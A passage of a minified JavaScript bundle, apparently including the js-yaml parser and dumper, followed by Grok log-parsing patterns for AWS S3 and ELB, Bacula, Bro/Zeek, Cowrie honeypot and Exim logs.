n?e.tag=o:w.call(e.tagMap,t)?e.tag=e.tagMap[t]+o:t==="!"?e.tag="!"+o:t==="!!"?e.tag="tag:yaml.org,2002:"+o:T(e,'undeclared tag handle "'+t+'"'),!0}function ft(e){var r,n;if(n=e.input.charCodeAt(e.position),n!==38)return!1;for(e.anchor!==null&&T(e,"duplication of an anchor property"),n=e.input.charCodeAt(++e.position),r=e.position;n!==0&&!P(n)&&!W(n);)n=e.input.charCodeAt(++e.position);return e.position===r&&T(e,"name of an anchor node must contain at least one character"),e.anchor=e.input.slice(r,e.position),!0}function St(e){var r,n,i;if(i=e.input.charCodeAt(e.position),i!==42)return!1;for(i=e.input.charCodeAt(++e.position),r=e.position;i!==0&&!P(i)&&!W(i);)i=e.input.charCodeAt(++e.position);return e.position===r&&T(e,"name of an alias node must contain at least one character"),n=e.input.slice(r,e.position),w.call(e.anchorMap,n)||T(e,'unidentified alias "'+n+'"'),e.result=e.anchorMap[n],N(e,!0,-1),!0}function V(e,r,n,i,t){var o,s,a,l=1,c=!1,u=!1,A,p,_,d,E,S;if(e.listener!==null&&e.listener("open",e),e.tag=null,e.anchor=null,e.kind=null,e.result=null,o=s=a=se===n||Cr===n,i&&N(e,!0,-1)&&(c=!0,e.lineIndent>r?l=1:e.lineIndent===r?l=0:e.lineIndent<r&&(l=-1)),l===1)for(;dt(e)||ft(e);)N(e,!0,-1)?(c=!0,a=o,e.lineIndent>r?l=1:e.lineIndent===r?l=0:e.lineIndent<r&&(l=-1)):a=!1;if(a&&(a=c||t),(l===1||se===n)&&(oe===n||Rr===n?E=r:E=r+1,S=e.position-e.lineStart,l===1?a&&($e(e,S)||Tt(e,S,E))||_t(e,E)?u=!0:(s&&Et(e,E)||ut(e,E)||pt(e,E)?u=!0:St(e)?(u=!0,(e.tag!==null||e.anchor!==null)&&T(e,"alias node should not have any properties")):At(e,E,oe===n)&&(u=!0,e.tag===null&&(e.tag="?")),e.anchor!==null&&(e.anchorMap[e.anchor]=e.result)):l===0&&(u=a&&$e(e,S))),e.tag===null)e.anchor!==null&&(e.anchorMap[e.anchor]=e.result);else if(e.tag==="?"){for(e.result!==null&&e.kind!=="scalar"&&T(e,'unacceptable node kind for !<?> tag; it should be "scalar", not "'+e.kind+'"'),A=0,p=e.implicitTypes.length;A<p;A+=1)if(d=e.implicitTypes[A],d.resolve(e.result)){e.result=d.construct(e.result),e.tag=d.tag,e.anchor!==null&&(e.anchorMap[e.anchor]=e.result);break}}else if(e.tag!=="!"){if(w.call(e.typeMap[e.kind||"fallback"],e.tag))d=e.typeMap[e.kind||"fallback"][e.tag];else for(d=null,_=e.typeMap.multi[e.kind||"fallback"],A=0,p=_.length;A<p;A+=1)if(e.tag.slice(0,_[A].tag.length)===_[A].tag){d=_[A];break}d||T(e,"unknown tag !<"+e.tag+">"),e.result!==null&&d.kind!==e.kind&&T(e,"unacceptable node kind for !<"+e.tag+'> tag; it should be "'+d.kind+'", not "'+e.kind+'"'),d.resolve(e.result,e.tag)?(e.result=d.construct(e.result,e.tag),e.anchor!==null&&(e.anchorMap[e.anchor]=e.result)):T(e,"cannot resolve a node with !<"+e.tag+"> explicit tag")}return e.listener!==null&&e.listener("close",e),e.tag!==null||e.anchor!==null||u}function Ot(e){var r=e.position,n,i,t,o=!1,s;for(e.version=null,e.checkLineBreaks=e.legacy,e.tagMap=Object.create(null),e.anchorMap=Object.create(null);(s=e.input.charCodeAt(e.position))!==0&&(N(e,!0,-1),s=e.input.charCodeAt(e.position),!(e.lineIndent>0||s!==37));){for(o=!0,s=e.input.charCodeAt(++e.position),n=e.position;s!==0&&!P(s);)s=e.input.charCodeAt(++e.position);for(i=e.input.slice(n,e.position),t=[],i.length<1&&T(e,"directive name must not be less than one character in length");s!==0;){for(;B(s);)s=e.input.charCodeAt(++e.position);if(s===35){do s=e.input.charCodeAt(++e.position);while(s!==0&&!y(s));break}if(y(s))break;for(n=e.position;s!==0&&!P(s);)s=e.input.charCodeAt(++e.position);t.push(e.input.slice(n,e.position))}s!==0&&Me(e),w.call(ke,i)?ke[i](e,i,t):ae(e,'unknown document directive "'+i+'"')}if(N(e,!0,-1),e.lineIndent===0&&e.input.charCodeAt(e.position)===45&&e.input.charCodeAt(e.position+1)===45&&e.input.charCodeAt(e.position+2)===45?(e.position+=3,N(e,!0,-1)):o&&T(e,"directives end mark is expected"),V(e,e.lineIndent-1,se,!1,!0),N(e,!0,-1),e.checkLineBreaks&&tt.test(e.input.slice(r,e.position))&&ae(e,"non-ASCII line breaks are interpreted as content"),e.documents.push(e.result),e.position===e.lineStart&&pe(e)){e.input.charCodeAt(e.position)===46&&(e.position+=3,N(e,!0,-1));return}if(e.position<e.length-1)T(e,"end of the stream or a document separator is expected");else return}function Mr(e,r){e=String(e),r=r||{},e.length!==0&&(e.charCodeAt(e.length-1)!==10&&e.charCodeAt(e.length-1)!==13&&(e+=`
`),e.charCodeAt(0)===65279&&(e=e.slice(1)));var n=new ct(e,r),i=e.indexOf("\0");for(i!==-1&&(n.position=i,T(n,"null byte is not allowed in input")),n.input+="\0";n.input.charCodeAt(n.position)===32;)n.lineIndent+=1,n.position+=1;for(;n.position<n.length-1;)Ot(n);return n.documents}function It(e,r,n){r!==null&&typeof r=="object"&&typeof n>"u"&&(n=r,r=null);var i=Mr(e,n);if(typeof r!="function")return i;for(var t=0,o=i.length;t<o;t+=1)r(i[t])}function ht(e,r){var n=Mr(e,r);if(n.length!==0){if(n.length===1)return n[0];throw new L("expected a single document in the stream, but found more")}}var Nt=It,mt=ht,xr={loadAll:Nt,load:mt},Gr=Object.prototype.toString,Ur=Object.prototype.hasOwnProperty,Ge=65279,Rt=9,z=10,Ct=13,Dt=32,gt=33,Lt=34,Re=35,Pt=37,vt=38,yt=39,Mt=42,Hr=44,xt=45,le=58,Gt=61,Ut=62,Ht=63,wt=64,wr=91,Fr=93,Ft=96,Br=123,Bt=124,br=125,g={};g[0]="\\0";g[7]="\\a";g[8]="\\b";g[9]="\\t";g[10]="\\n";g[11]="\\v";g[12]="\\f";g[13]="\\r";g[27]="\\e";g[34]='\\"';g[92]="\\\\";g[133]="\\N";g[160]="\\_";g[8232]="\\L";g[8233]="\\P";var bt=["y","Y","yes","Yes","YES","on","On","ON","n","N","no","No","NO","off","Off","OFF"],Yt=/^[-+]?[0-9_]+(?::[0-9_]+)+(?:\.[0-9_]*)?$/;function kt(e,r){var n,i,t,o,s,a,l;if(r===null)return{};for(n={},i=Object.keys(r),t=0,o=i.length;t<o;t+=1)s=i[t],a=String(r[s]),s.slice(0,2)==="!!"&&(s="tag:yaml.org,2002:"+s.slice(2)),l=e.compiledTypeMap.fallback[s],l&&Ur.call(l.styleAliases,a)&&(a=l.styleAliases[a]),n[s]=a;return n}function Wt(e){var r,n,i;if(r=e.toString(16).toUpperCase(),e<=255)n="x",i=2;else if(e<=65535)n="u",i=4;else if(e<=4294967295)n="U",i=8;else throw new L("code point within a string may not be greater than 0xFFFFFFFF");return"\\"+n+R.repeat("0",i-r.length)+r}var $t=1,Z=2;function Vt(e){this.schema=e.schema||ye,this.indent=Math.max(1,e.indent||2),this.noArrayIndent=e.noArrayIndent||!1,this.skipInvalid=e.skipInvalid||!1,this.flowLevel=R.isNothing(e.flowLevel)?-1:e.flowLevel,this.styleMap=kt(this.schema,e.styles||null),this.sortKeys=e.sortKeys||!1,this.lineWidth=e.lineWidth||80,this.noRefs=e.noRefs||!1,this.noCompatMode=e.noCompatMode||!1,this.condenseFlow=e.condenseFlow||!1,this.quotingType=e.quotingType==='"'?Z:$t,this.forceQuotes=e.forceQuotes||!1,this.replacer=typeof e.replacer=="function"?e.replacer:null,this.implicitTypes=this.schema.compiledImplicit,this.explicitTypes=this.schema.compiledExplicit,this.tag=null,this.result="",this.duplicates=[],this.usedDuplicates=null}function Ve(e,r){for(var n=R.repeat(" ",r),i=0,t=-1,o="",s,a=e.length;i<a;)t=e.indexOf(`
`,i),t===-1?(s=e.slice(i),i=a):(s=e.slice(i,t+1),i=t+1),s.length&&s!==`
`&&(o+=n),o+=s;return o}function Ce(e,r){return`
`+R.repeat(" ",e.indent*r)}function qt(e,r){var n,i,t;for(n=0,i=e.implicitTypes.length;n<i;n+=1)if(t=e.implicitTypes[n],t.resolve(r))return!0;return!1}function ce(e){return e===Dt||e===Rt}function ee(e){return 32<=e&&e<=126||161<=e&&e<=55295&&e!==8232&&e!==8233||57344<=e&&e<=65533&&e!==Ge||65536<=e&&e<=1114111}function qe(e){return ee(e)&&e!==Ge&&e!==Ct&&e!==z}function Ke(e,r,n){var i=qe(e),t=i&&!ce(e);return(n?i:i&&e!==Hr&&e!==wr&&e!==Fr&&e!==Br&&e!==br)&&e!==Re&&!(r===le&&!t)||qe(r)&&!ce(r)&&e===Re||r===le&&t}function Kt(e){return ee(e)&&e!==Ge&&!ce(e)&&e!==xt&&e!==Ht&&e!==le&&e!==Hr&&e!==wr&&e!==Fr&&e!==Br&&e!==br&&e!==Re&&e!==vt&&e!==Mt&&e!==gt&&e!==Bt&&e!==Gt&&e!==Ut&&e!==yt&&e!==Lt&&e!==Pt&&e!==wt&&e!==Ft}function Xt(e){return!ce(e)&&e!==le}function j(e,r){var n=e.charCodeAt(r),i;return n>=55296&&n<=56319&&r+1<e.length&&(i=e.charCodeAt(r+1),i>=56320&&i<=57343)?(n-55296)*1024+i-56320+65536:n}function Yr(e){var r=/^\n* /;return r.test(e)}var kr=1,De=2,Wr=3,$r=4,k=5;function Jt(e,r,n,i,t,o,s,a){var l,c=0,u=null,A=!1,p=!1,_=i!==-1,d=-1,E=Kt(j(e,0))&&Xt(j(e,e.length-1));if(r||s)for(l=0;l<e.length;c>=65536?l+=2:l++){if(c=j(e,l),!ee(c))return k;E=E&&Ke(c,u,a),u=c}else{for(l=0;l<e.length;c>=65536?l+=2:l++){if(c=j(e,l),c===z)A=!0,_&&(p=p||l-d-1>i&&e[d+1]!==" ",d=l);else if(!ee(c))return k;E=E&&Ke(c,u,a),u=c}p=p||_&&l-d-1>i&&e[d+1]!==" "}return!A&&!p?E&&!s&&!t(e)?kr:o===Z?k:De:n>9&&Yr(e)?k:s?o===Z?k:De:p?$r:Wr}function jt(e,r,n,i,t){e.dump=function(){if(r.length===0)return e.quotingType===Z?'""':"''";if(!e.noCompatMode&&(bt.indexOf(r)!==-1||Yt.test(r)))return e.quotingType===Z?'"'+r+'"':"'"+r+"'";var o=e.indent*Math.max(1,n),s=e.lineWidth===-1?-1:Math.max(Math.min(e.lineWidth,40),e.lineWidth-o),a=i||e.flowLevel>-1&&n>=e.flowLevel;function l(c){return qt(e,c)}switch(Jt(r,a,e.indent,s,l,e.quotingType,e.forceQuotes&&!i,t)){case kr:return r;case De:return"'"+r.replace(/'/g,"''")+"'";case Wr:return"|"+Xe(r,e.indent)+Je(Ve(r,o));case $r:return">"+Xe(r,e.indent)+Je(Ve(Qt(r,s),o));case k:return'"'+zt(r)+'"';default:throw new L("impossible error: invalid scalar style")}}()}function Xe(e,r){var n=Yr(e)?String(r):"",i=e[e.length-1]===`
`,t=i&&(e[e.length-2]===`
`||e===`
`),o=t?"+":i?"":"-";return n+o+`
`}function Je(e){return e[e.length-1]===`
`?e.slice(0,-1):e}function Qt(e,r){for(var n=/(\n+)([^\n]*)/g,i=function(){var c=e.indexOf(`
`);return c=c!==-1?c:e.length,n.lastIndex=c,je(e.slice(0,c),r)}(),t=e[0]===`
`||e[0]===" ",o,s;s=n.exec(e);){var a=s[1],l=s[2];o=l[0]===" ",i+=a+(!t&&!o&&l!==""?`
`:"")+je(l,r),t=o}return i}function je(e,r){if(e===""||e[0]===" ")return e;for(var n=/ [^ ]/g,i,t=0,o,s=0,a=0,l="";i=n.exec(e);)a=i.index,a-t>r&&(o=s>t?s:a,l+=`
`+e.slice(t,o),t=o+1),s=a;return l+=`
`,e.length-t>r&&s>t?l+=e.slice(t,s)+`
`+e.slice(s+1):l+=e.slice(t),l.slice(1)}function zt(e){for(var r="",n=0,i,t=0;t<e.length;n>=65536?t+=2:t++)n=j(e,t),i=g[n],!i&&ee(n)?(r+=e[t],n>=65536&&(r+=e[t+1])):r+=i||Wt(n);return r}function Zt(e,r,n){var i="",t=e.tag,o,s,a;for(o=0,s=n.length;o<s;o+=1)a=n[o],e.replacer&&(a=e.replacer.call(n,String(o),a)),(x(e,r,a,!1,!1)||typeof a>"u"&&x(e,r,null,!1,!1))&&(i!==""&&(i+=","+(e.condenseFlow?"":" ")),i+=e.dump);e.tag=t,e.dump="["+i+"]"}function Qe(e,r,n,i){var t="",o=e.tag,s,a,l;for(s=0,a=n.length;s<a;s+=1)l=n[s],e.replacer&&(l=e.replacer.call(n,String(s),l)),(x(e,r+1,l,!0,!0,!1,!0)||typeof l>"u"&&x(e,r+1,null,!0,!0,!1,!0))&&((!i||t!=="")&&(t+=Ce(e,r)),e.dump&&z===e.dump.charCodeAt(0)?t+="-":t+="- ",t+=e.dump);e.tag=o,e.dump=t||"[]"}function ei(e,r,n){var i="",t=e.tag,o=Object.keys(n),s,a,l,c,u;for(s=0,a=o.length;s<a;s+=1)u="",i!==""&&(u+=", "),e.condenseFlow&&(u+='"'),l=o[s],c=n[l],e.replacer&&(c=e.replacer.call(n,l,c)),x(e,r,l,!1,!1)&&(e.dump.length>1024&&(u+="? "),u+=e.dump+(e.condenseFlow?'"':"")+":"+(e.condenseFlow?"":" "),x(e,r,c,!1,!1)&&(u+=e.dump,i+=u));e.tag=t,e.dump="{"+i+"}"}function ri(e,r,n,i){var t="",o=e.tag,s=Object.keys(n),a,l,c,u,A,p;if(e.sortKeys===!0)s.sort();else if(typeof e.sortKeys=="function")s.sort(e.sortKeys);else if(e.sortKeys)throw new L("sortKeys must be a boolean or a function");for(a=0,l=s.length;a<l;a+=1)p="",(!i||t!=="")&&(p+=Ce(e,r)),c=s[a],u=n[c],e.replacer&&(u=e.replacer.call(n,c,u)),x(e,r+1,c,!0,!0,!0)&&(A=e.tag!==null&&e.tag!=="?"||e.dump&&e.dump.length>1024,A&&(e.dump&&z===e.dump.charCodeAt(0)?p+="?":p+="? "),p+=e.dump,A&&(p+=Ce(e,r)),x(e,r+1,u,!0,A)&&(e.dump&&z===e.dump.charCodeAt(0)?p+=":":p+=": ",p+=e.dump,t+=p));e.tag=o,e.dump=t||"{}"}function ze(e,r,n){var i,t,o,s,a,l;for(t=n?e.explicitTypes:e.implicitTypes,o=0,s=t.length;o<s;o+=1)if(a=t[o],(a.instanceOf||a.predicate)&&(!a.instanceOf||typeof r=="object"&&r instanceof a.instanceOf)&&(!a.predicate||a.predicate(r))){if(n?a.multi&&a.representName?e.tag=a.representName(r):e.tag=a.tag:e.tag="?",a.represent){if(l=e.styleMap[a.tag]||a.defaultStyle,Gr.call(a.represent)==="[object Function]")i=a.represent(r,l);else if(Ur.call(a.represent,l))i=a.represent[l](r,l);else throw new L("!<"+a.tag+'> tag resolver accepts not "'+l+'" style');e.dump=i}return!0}return!1}function x(e,r,n,i,t,o,s){e.tag=null,e.dump=n,ze(e,n,!1)||ze(e,n,!0);var a=Gr.call(e.dump),l=i,c;i&&(i=e.flowLevel<0||e.flowLevel>r);var u=a==="[object Object]"||a==="[object Array]",A,p;if(u&&(A=e.duplicates.indexOf(n),p=A!==-1),(e.tag!==null&&e.tag!=="?"||p||e.indent!==2&&r>0)&&(t=!1),p&&e.usedDuplicates[A])e.dump="*ref_"+A;else{if(u&&p&&!e.usedDuplicates[A]&&(e.usedDuplicates[A]=!0),a==="[object Object]")i&&Object.keys(e.dump).length!==0?(ri(e,r,e.dump,t),p&&(e.dump="&ref_"+A+e.dump)):(ei(e,r,e.dump),p&&(e.dump="&ref_"+A+" "+e.dump));else if(a==="[object Array]")i&&e.dump.length!==0?(e.noArrayIndent&&!s&&r>0?Qe(e,r-1,e.dump,t):Qe(e,r,e.dump,t),p&&(e.dump="&ref_"+A+e.dump)):(Zt(e,r,e.dump),p&&(e.dump="&ref_"+A+" "+e.dump));else if(a==="[object String]")e.tag!=="?"&&jt(e,e.dump,r,o,l);else{if(a==="[object Undefined]")return!1;if(e.skipInvalid)return!1;throw new L("unacceptable kind of an object to dump "+a)}e.tag!==null&&e.tag!=="?"&&(c=encodeURI(e.tag[0]==="!"?e.tag.slice(1):e.tag).replace(/!/g,"%21"),e.tag[0]==="!"?c="!"+c:c.slice(0,18)==="tag:yaml.org,2002:"?c="!!"+c.slice(18):c="!<"+c+">",e.dump=c+" "+e.dump)}return!0}function ni(e,r){var n=[],i=[],t,o;for(ge(e,n,i),t=0,o=i.length;t<o;t+=1)r.duplicates.push(n[i[t]]);r.usedDuplicates=new Array(o)}function ge(e,r,n){var i,t,o;if(e!==null&&typeof e=="object")if(t=r.indexOf(e),t!==-1)n.indexOf(t)===-1&&n.push(t);else if(r.push(e),Array.isArray(e))for(t=0,o=e.length;t<o;t+=1)ge(e[t],r,n);else for(i=Object.keys(e),t=0,o=i.length;t<o;t+=1)ge(e[i[t]],r,n)}function ti(e,r){r=r||{};var n=new Vt(r);n.noRefs||ni(e,n);var i=e;return n.replacer&&(i=n.replacer.call({"":i},"",i)),x(n,0,i,!0,!0)?n.dump+`
`:""}var ii=ti,oi={dump:ii};function Ue(e,r){return function(){throw new Error("Function yaml."+e+" is removed in js-yaml 4. Use yaml."+r+" instead, which is now safe by default.")}}var si=D,ai=or,li=cr,ci=Er,Ai=Tr,ui=ye,pi=xr.load,_i=xr.loadAll,Ei=oi.dump,Ti=L,di={binary:Ir,float:_r,map:lr,null:Ar,pairs:Nr,set:mr,timestamp:Sr,bool:ur,int:pr,merge:Or,omap:hr,seq:ar,str:sr},fi=Ue("safeLoad","load"),Si=Ue("safeLoadAll","loadAll"),Oi=Ue("safeDump","dump"),Vr={Type:si,Schema:ai,FAILSAFE_SCHEMA:li,JSON_SCHEMA:ci,CORE_SCHEMA:Ai,DEFAULT_SCHEMA:ui,load:pi,loadAll:_i,dump:Ei,YAMLException:Ti,types:di,safeLoad:fi,safeLoadAll:Si,safeDump:Oi};const Ii=`
# === aws ===
S3_REQUEST_LINE (?:%{WORD:verb} %{NOTSPACE:request}(?: HTTP/%{NUMBER:httpversion})?|%{DATA:rawrequest})

S3_ACCESS_LOG %{WORD:owner} %{NOTSPACE:bucket} \\[%{HTTPDATE:timestamp}\\] %{IP:clientip} %{NOTSPACE:requester} %{NOTSPACE:request_id} %{NOTSPACE:operation} %{NOTSPACE:key} (?:"%{S3_REQUEST_LINE}"|-) (?:%{INT:response:int}|-) (?:-|%{NOTSPACE:error_code}) (?:%{INT:bytes:int}|-) (?:%{INT:object_size:int}|-) (?:%{INT:request_time_ms:int}|-) (?:%{INT:turnaround_time_ms:int}|-) (?:%{QS:referrer}|-) (?:"?%{QS:agent}"?|-) (?:-|%{NOTSPACE:version_id})

ELB_URIPATHPARAM %{URIPATH:path}(?:%{URIPARAM:params})?

ELB_URI %{URIPROTO:proto}://(?:%{USER}(?::[^@]*)?@)?(?:%{URIHOST:urihost})?(?:%{ELB_URIPATHPARAM})?

ELB_REQUEST_LINE (?:%{WORD:verb} %{ELB_URI:request}(?: HTTP/%{NUMBER:httpversion})?|%{DATA:rawrequest})

ELB_ACCESS_LOG %{TIMESTAMP_ISO8601:timestamp} %{NOTSPACE:elb} %{IP:clientip}:%{INT:clientport:int} (?:(%{IP:backendip}:?:%{INT:backendport:int})|-) %{NUMBER:request_processing_time:float} %{NUMBER:backend_processing_time:float} %{NUMBER:response_processing_time:float} %{INT:response:int} %{INT:backend_response:int} %{INT:received_bytes:int} %{INT:bytes:int} "%{ELB_REQUEST_LINE}"
# === bacula ===
BACULA_TIMESTAMP %{MONTHDAY}-%{MONTH} %{HOUR}:%{MINUTE}
BACULA_HOST [a-zA-Z0-9-]+
BACULA_VOLUME %{USER}
BACULA_DEVICE %{USER}
BACULA_DEVICEPATH %{UNIXPATH}
BACULA_CAPACITY %{INT}{1,3}(,%{INT}{3})*
BACULA_VERSION %{USER}
BACULA_JOB %{USER}

BACULA_LOG_MAX_CAPACITY User defined maximum volume capacity %{BACULA_CAPACITY} exceeded on device \\"%{BACULA_DEVICE:device}\\" \\(%{BACULA_DEVICEPATH}\\)
BACULA_LOG_END_VOLUME End of medium on Volume \\"%{BACULA_VOLUME:volume}\\" Bytes=%{BACULA_CAPACITY} Blocks=%{BACULA_CAPACITY} at %{MONTHDAY}-%{MONTH}-%{YEAR} %{HOUR}:%{MINUTE}.
BACULA_LOG_NEW_VOLUME Created new Volume \\"%{BACULA_VOLUME:volume}\\" in catalog.
BACULA_LOG_NEW_LABEL Labeled new Volume \\"%{BACULA_VOLUME:volume}\\" on device \\"%{BACULA_DEVICE:device}\\" \\(%{BACULA_DEVICEPATH}\\).
BACULA_LOG_WROTE_LABEL Wrote label to prelabeled Volume \\"%{BACULA_VOLUME:volume}\\" on device \\"%{BACULA_DEVICE}\\" \\(%{BACULA_DEVICEPATH}\\)
BACULA_LOG_NEW_MOUNT New volume \\"%{BACULA_VOLUME:volume}\\" mounted on device \\"%{BACULA_DEVICE:device}\\" \\(%{BACULA_DEVICEPATH}\\) at %{MONTHDAY}-%{MONTH}-%{YEAR} %{HOUR}:%{MINUTE}.
BACULA_LOG_NOOPEN \\s+Cannot open %{DATA}: ERR=%{GREEDYDATA:berror}
BACULA_LOG_NOOPENDIR \\s+Could not open directory %{DATA}: ERR=%{GREEDYDATA:berror}
BACULA_LOG_NOSTAT \\s+Could not stat %{DATA}: ERR=%{GREEDYDATA:berror}
BACULA_LOG_NOJOBS There are no more Jobs associated with Volume \\"%{BACULA_VOLUME:volume}\\". Marking it purged.
BACULA_LOG_ALL_RECORDS_PRUNED All records pruned from Volume \\"%{BACULA_VOLUME:volume}\\"; marking it \\"Purged\\"
BACULA_LOG_BEGIN_PRUNE_JOBS Begin pruning Jobs older than %{INT} month %{INT} days .
BACULA_LOG_BEGIN_PRUNE_FILES Begin pruning Files.
BACULA_LOG_PRUNED_JOBS Pruned %{INT} Jobs* for client %{BACULA_HOST:client} from catalog.
BACULA_LOG_PRUNED_FILES Pruned Files from %{INT} Jobs* for client %{BACULA_HOST:client} from catalog.
BACULA_LOG_ENDPRUNE End auto prune.
BACULA_LOG_STARTJOB Start Backup JobId %{INT}, Job=%{BACULA_JOB:job}
BACULA_LOG_STARTRESTORE Start Restore Job %{BACULA_JOB:job}
BACULA_LOG_USEDEVICE Using Device \\"%{BACULA_DEVICE:device}\\"
BACULA_LOG_DIFF_FS \\s+%{UNIXPATH} is a different filesystem. Will not descend from %{UNIXPATH} into it.
BACULA_LOG_JOBEND Job write elapsed time = %{DATA:elapsed}, Transfer rate = %{NUMBER} (K|M|G)? Bytes/second
BACULA_LOG_NOPRUNE_JOBS No Jobs found to prune.
BACULA_LOG_NOPRUNE_FILES No Files found to prune.
BACULA_LOG_VOLUME_PREVWRITTEN Volume \\"%{BACULA_VOLUME:volume}\\" previously written, moving to end of data.
BACULA_LOG_READYAPPEND Ready to append to end of Volume \\"%{BACULA_VOLUME:volume}\\" size=%{INT}
BACULA_LOG_CANCELLING Cancelling duplicate JobId=%{INT}.
BACULA_LOG_MARKCANCEL JobId %{INT}, Job %{BACULA_JOB:job} marked to be canceled.
BACULA_LOG_CLIENT_RBJ shell command: run ClientRunBeforeJob \\"%{GREEDYDATA:runjob}\\"
BACULA_LOG_VSS (Generate )?VSS (Writer)?
BACULA_LOG_MAXSTART Fatal error: Job canceled because max start delay time exceeded.
BACULA_LOG_DUPLICATE Fatal error: JobId %{INT:duplicate} already running. Duplicate job not allowed.
BACULA_LOG_NOJOBSTAT Fatal error: No Job status returned from FD.
BACULA_LOG_FATAL_CONN Fatal error: bsock.c:133 Unable to connect to (Client: %{BACULA_HOST:client}|Storage daemon) on %{HOSTNAME}:%{POSINT}. ERR=%{GREEDYDATA:berror}
BACULA_LOG_NO_CONNECT Warning: bsock.c:127 Could not connect to (Client: %{BACULA_HOST:client}|Storage daemon) on %{HOSTNAME}:%{POSINT}. ERR=%{GREEDYDATA:berror}
BACULA_LOG_NO_AUTH Fatal error: Unable to authenticate with File daemon at %{HOSTNAME}. Possible causes:
BACULA_LOG_NOSUIT No prior or suitable Full backup found in catalog. Doing FULL backup.
BACULA_LOG_NOPRIOR No prior Full backup Job record found.

BACULA_LOG_JOB (Error: )?Bacula %{BACULA_HOST} %{BACULA_VERSION} \\(%{BACULA_VERSION}\\):

BACULA_LOGLINE %{BACULA_TIMESTAMP:bts} %{BACULA_HOST:hostname} JobId %{INT:jobid}: (%{BACULA_LOG_MAX_CAPACITY}|%{BACULA_LOG_END_VOLUME}|%{BACULA_LOG_NEW_VOLUME}|%{BACULA_LOG_NEW_LABEL}|%{BACULA_LOG_WROTE_LABEL}|%{BACULA_LOG_NEW_MOUNT}|%{BACULA_LOG_NOOPEN}|%{BACULA_LOG_NOOPENDIR}|%{BACULA_LOG_NOSTAT}|%{BACULA_LOG_NOJOBS}|%{BACULA_LOG_ALL_RECORDS_PRUNED}|%{BACULA_LOG_BEGIN_PRUNE_JOBS}|%{BACULA_LOG_BEGIN_PRUNE_FILES}|%{BACULA_LOG_PRUNED_JOBS}|%{BACULA_LOG_PRUNED_FILES}|%{BACULA_LOG_ENDPRUNE}|%{BACULA_LOG_STARTJOB}|%{BACULA_LOG_STARTRESTORE}|%{BACULA_LOG_USEDEVICE}|%{BACULA_LOG_DIFF_FS}|%{BACULA_LOG_JOBEND}|%{BACULA_LOG_NOPRUNE_JOBS}|%{BACULA_LOG_NOPRUNE_FILES}|%{BACULA_LOG_VOLUME_PREVWRITTEN}|%{BACULA_LOG_READYAPPEND}|%{BACULA_LOG_CANCELLING}|%{BACULA_LOG_MARKCANCEL}|%{BACULA_LOG_CLIENT_RBJ}|%{BACULA_LOG_VSS}|%{BACULA_LOG_MAXSTART}|%{BACULA_LOG_DUPLICATE}|%{BACULA_LOG_NOJOBSTAT}|%{BACULA_LOG_FATAL_CONN}|%{BACULA_LOG_NO_CONNECT}|%{BACULA_LOG_NO_AUTH}|%{BACULA_LOG_NOSUIT}|%{BACULA_LOG_JOB}|%{BACULA_LOG_NOPRIOR})
# === bro ===
# https://www.bro.org/sphinx/script-reference/log-files.html

# http.log
BRO_HTTP %{NUMBER:ts}\\t%{NOTSPACE:uid}\\t%{IP:orig_h}\\t%{INT:orig_p}\\t%{IP:resp_h}\\t%{INT:resp_p}\\t%{INT:trans_depth}\\t%{GREEDYDATA:method}\\t%{GREEDYDATA:domain}\\t%{GREEDYDATA:uri}\\t%{GREEDYDATA:referrer}\\t%{GREEDYDATA:user_agent}\\t%{NUMBER:request_body_len}\\t%{NUMBER:response_body_len}\\t%{GREEDYDATA:status_code}\\t%{GREEDYDATA:status_msg}\\t%{GREEDYDATA:info_code}\\t%{GREEDYDATA:info_msg}\\t%{GREEDYDATA:filename}\\t%{GREEDYDATA:bro_tags}\\t%{GREEDYDATA:username}\\t%{GREEDYDATA:password}\\t%{GREEDYDATA:proxied}\\t%{GREEDYDATA:orig_fuids}\\t%{GREEDYDATA:orig_mime_types}\\t%{GREEDYDATA:resp_fuids}\\t%{GREEDYDATA:resp_mime_types}

# dns.log
BRO_DNS %{NUMBER:ts}\\t%{NOTSPACE:uid}\\t%{IP:orig_h}\\t%{INT:orig_p}\\t%{IP:resp_h}\\t%{INT:resp_p}\\t%{WORD:proto}\\t%{INT:trans_id}\\t%{GREEDYDATA:query}\\t%{GREEDYDATA:qclass}\\t%{GREEDYDATA:qclass_name}\\t%{GREEDYDATA:qtype}\\t%{GREEDYDATA:qtype_name}\\t%{GREEDYDATA:rcode}\\t%{GREEDYDATA:rcode_name}\\t%{GREEDYDATA:AA}\\t%{GREEDYDATA:TC}\\t%{GREEDYDATA:RD}\\t%{GREEDYDATA:RA}\\t%{GREEDYDATA:Z}\\t%{GREEDYDATA:answers}\\t%{GREEDYDATA:TTLs}\\t%{GREEDYDATA:rejected}

# conn.log
BRO_CONN %{NUMBER:ts}\\t%{NOTSPACE:uid}\\t%{IP:orig_h}\\t%{INT:orig_p}\\t%{IP:resp_h}\\t%{INT:resp_p}\\t%{WORD:proto}\\t%{GREEDYDATA:service}\\t%{NUMBER:duration}\\t%{NUMBER:orig_bytes}\\t%{NUMBER:resp_bytes}\\t%{GREEDYDATA:conn_state}\\t%{GREEDYDATA:local_orig}\\t%{GREEDYDATA:missed_bytes}\\t%{GREEDYDATA:history}\\t%{GREEDYDATA:orig_pkts}\\t%{GREEDYDATA:orig_ip_bytes}\\t%{GREEDYDATA:resp_pkts}\\t%{GREEDYDATA:resp_ip_bytes}\\t%{GREEDYDATA:tunnel_parents}

# files.log
BRO_FILES %{NUMBER:ts}\\t%{NOTSPACE:fuid}\\t%{IP:tx_hosts}\\t%{IP:rx_hosts}\\t%{NOTSPACE:conn_uids}\\t%{GREEDYDATA:source}\\t%{GREEDYDATA:depth}\\t%{GREEDYDATA:analyzers}\\t%{GREEDYDATA:mime_type}\\t%{GREEDYDATA:filename}\\t%{GREEDYDATA:duration}\\t%{GREEDYDATA:local_orig}\\t%{GREEDYDATA:is_orig}\\t%{GREEDYDATA:seen_bytes}\\t%{GREEDYDATA:total_bytes}\\t%{GREEDYDATA:missing_bytes}\\t%{GREEDYDATA:overflow_bytes}\\t%{GREEDYDATA:timedout}\\t%{GREEDYDATA:parent_fuid}\\t%{GREEDYDATA:md5}\\t%{GREEDYDATA:sha1}\\t%{GREEDYDATA:sha256}\\t%{GREEDYDATA:extracted}
# === cowrie_honeypot ===
COWRIE_NEW_CO New connection: %{IPV4:source_ip}:[0-9]+ \\(%{IPV4:dest_ip}:%{INT:dest_port}\\) \\[session: %{DATA:telnet_session}\\]$
# === exim ===
EXIM_MSGID [0-9A-Za-z]{6}-[0-9A-Za-z]{6}-[0-9A-Za-z]{2}
